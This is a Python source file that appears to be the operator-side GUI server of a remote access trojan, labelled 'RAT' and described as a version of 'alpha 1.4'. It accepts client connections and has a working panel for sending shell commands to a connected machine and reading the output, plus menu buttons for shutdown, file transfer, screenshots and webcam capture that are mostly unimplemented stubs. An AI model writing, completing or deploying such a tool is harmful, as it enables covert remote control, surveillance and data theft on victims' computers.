# the same as alpha 1.4, but with a gui for the server
import customtkinter as ctk
import socket
import threading
import time
import sys
import os

inhalte = []

def action_cmdcommand(client: socket.socket, content: ctk.CTkFrame):
    global inhalte
    print(inhalte, 1)
    if len(inhalte) > 0:
        print(inhalte, 2)
        for item in inhalte:
            item.destroy()
        inhalte = []

    print(inhalte, 3)
    
    output_field = ctk.CTkTextbox(content, height=300, width=500)
    output_field.pack(expand=True, pady=10, padx=10)
    inhalte.append(output_field)
    
    input_cmd = ctk.CTkEntry(content, placeholder_text='Command', width=500)
    input_cmd.pack(expand=True, side='left', pady=10, padx=10)
    inhalte.append(input_cmd)
    
    send_cmd_button = ctk.CTkButton(content, text='Send CMD', command=lambda: action_cmdcommand_sendcmd(client, input_cmd.get(), output_field))
    send_cmd_button.pack(side='right', pady=10, padx=10)
    inhalte.append(send_cmd_button)

def action_cmdcommand_sendcmd(client: socket.socket, cmd: str, outputfield: ctk.CTkTextbox):
    if cmd == '':
        cmd = 'cd'
    client.send('cmd'.encode())
    client.send(cmd.encode())
    output = client.recv(1024).decode()
    outputfield.delete(index1='1.0', index2='1000.0')
    outputfield.insert(index='1.0', text=output)


def action_screenshot(client: socket.socket, content: ctk.CTkFrame):
    global inhalte
    print(inhalte, 1)
    if len(inhalte) > 0:
        print(inhalte, 2)
        for item in inhalte:
            item.destroy()
        inhalte = []

    print(inhalte, 3)


def gui(client: socket.socket, addr):
    ctk.set_appearance_mode('dark')
    ctk.set_default_color_theme('dark-blue')
    
    global root
    root = ctk.CTk()
    root.title(f'Client: {addr}')
    root.iconbitmap(os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'icon.png'))
    root.geometry('900x450')
    root.resizable(False, False)
    
    menu = ctk.CTkFrame(root)
    menu.pack(fill='both', expand=False, side='left')
    
    content = ctk.CTkFrame(root, height=450, width=700)
    content.pack(pady=20, padx=20, fill='both', expand=True, side='right')
    
    title = ctk.CTkLabel(menu, text='RAT', font=('Robot', 24))
    title.pack(pady=10, padx=20)
    
    buttons = [
        ctk.CTkButton(menu, text='CMD Command', command=lambda: action_cmdcommand(client, content)),
        ctk.CTkButton(menu, text='Shutdown', command=lambda: action_screenshot(client, content)),
        ctk.CTkButton(menu, text='Restart'),
        ctk.CTkButton(menu, text='Logout'),
        ctk.CTkButton(menu, text='Put File'),
        ctk.CTkButton(menu, text='Get File'),
        ctk.CTkButton(menu, text='Screenshot'),
        ctk.CTkButton(menu, text='Camera Image'),
        ctk.CTkButton(menu, text='Camera Livestream')
    ]
    
    for button in buttons:
        button.pack(pady=10, padx=20)
    
    root.mainloop()

def handle_connection(client: socket.socket, addr):
    print(f'Client connected: {addr}')
    try:
        gui(client=client, addr=addr)
    except:
        print(f'Client disconnected: {addr}')
    finally:
        client.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', 1234))
    s.listen(1)
    print('Waiting for connections...')
    
    while True:
        client, addr = s.accept()
        threading.Thread(target=handle_connection, args=(client, addr)).start()

if __name__ == '__main__':
    main()